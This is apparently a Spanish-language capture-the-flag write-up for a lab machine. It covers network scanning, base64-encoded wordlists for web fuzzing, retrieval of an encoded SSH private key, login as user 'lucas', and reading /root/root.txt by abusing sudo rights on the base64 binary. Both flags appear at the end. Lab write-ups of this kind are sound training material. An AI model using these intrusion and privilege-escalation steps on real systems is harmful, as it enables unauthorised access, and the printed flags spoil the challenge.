
```bash
arp-scan -I eth0 --localnet
nmap -p- --open -sS -sC -sV --min-rate 5000 -vvv -n -Pn 10.0.2.27 -oN escaneo
echo "QUxMLCBhYnNvbHV0ZWx5IEFMTCB0aGF0IHlvdSBuZWVkIGlzIGluIEJBU0U2NC4KSW5jbHVkaW5nIHRoZSBwYXNzd29yZCB0aGF0IHlvdSBuZWVkIDopClJlbWVtYmVyLCBCQVNFNjQgaGFzIHRoZSBhbnN3ZXIgdG8gYWxsIHlvdXIgcXVlc3Rpb25zLgotbHVjYXMK" > text.txt
base64 -d text.txt 
echo "iloveyou
youloveyou                                    
shelovesyou
helovesyou
weloveyou
theyhatesme" > dic.txt
nano encript.sh
bash encript.sh dic.txt > endic.txt
bash encript.sh /usr/share/wordlists/dirb/common.txt > common.txt
wget http://10.0.2.27/aWRfcnNhCg==
wget http://10.0.2.27/cm9ib3RzLnR4dAo=
base64 -d aWRfcnNhCg== > id_rsa
base64 -d cm9ib3RzLnR4dAo= > nada.txt
chmod 600 id_rsa
ssh lucas@10.0.2.27 -i id_rsa
```

Primero de todo buscamos la IP de la máquina realizando un arp-scan, una vez tenemos su IP realizamos un nmap para ver los puertos abiertos donde vemos que tiene los puertos 22 y 80 abiertos.
![[Pasted image 20240310124319.png]]
Entramos en la web y nos encontramos un texto encriptado en base64 que desencriptaremos con base64 además de una especie de contraseñas o directorios.
![[Pasted image 20240310124612.png]]
Ahora desencriptamos el texto y encontramos un posible usuario (lucas) además de una pista de que tenemos que encriptar y desencriptar todo en base64.
![[Pasted image 20240310124744.png]]
Ahora encriptaremos el diccionario que encontramos en la web para ello primero creamos un pequeño script para encriptar cada linea en base64
![[Pasted image 20240310125535.png]]
```bash
#!bin/bash

for i in $(cat $1); do
    echo $i | base64
done
```
Ahora encriptamos el comentario de la web y no encontramos nada tanto por  fuerza bruta a lucas como fuzzing con gobuster, así que decidimos encriptar el common.txt y hacer fuzzing web.
![[Pasted image 20240310130111.png]]
Y ahora por fin nos encuentra dos directorios los cuales nos descargamos de la web y desencriptamos.
![[Pasted image 20240310130449.png]]
Encontramos que el primero es un id_rsa así que lo guardamos como id_rsa y le damos permisos necesarios y entramos pero nos pide un paraphrase, yo probe con la primera del fichero endic.txt y entré al usuario lucas consiguiendo su flag.
![[Pasted image 20240310154123.png]]
```bash
cat user.txt
sudo -l
sudo base64 "/root/root.txt" | base64 --decode
```
Haciendo un sudo -l encontramos que tenemos permisos sudo en el binario base64 e intentaremos utilizar eso para leer el archivo /root/root.txt.
![[Pasted image 20240310154554.png]]

Flag de user: HMV8nnJAJAJA
Flag de root: HMVFKBS64